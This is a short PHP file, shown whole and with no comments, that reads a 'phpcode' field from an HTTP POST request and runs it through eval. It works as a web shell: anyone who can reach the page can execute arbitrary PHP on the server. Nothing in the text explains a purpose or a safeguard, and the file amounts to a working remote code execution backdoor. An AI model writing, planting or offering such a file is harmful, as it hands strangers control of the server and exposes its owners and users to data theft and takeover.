<?php
$phpcode = $_POST['phpcode']; 
$phpcode = trim($phpcode); 
if($phpcode){ 
	$phpcode = "<?php\n\n{$phpcode}\n\n?>"; 
	eval("?".">$phpcode<?"); 
	echo '<br><br>'; 
}
?>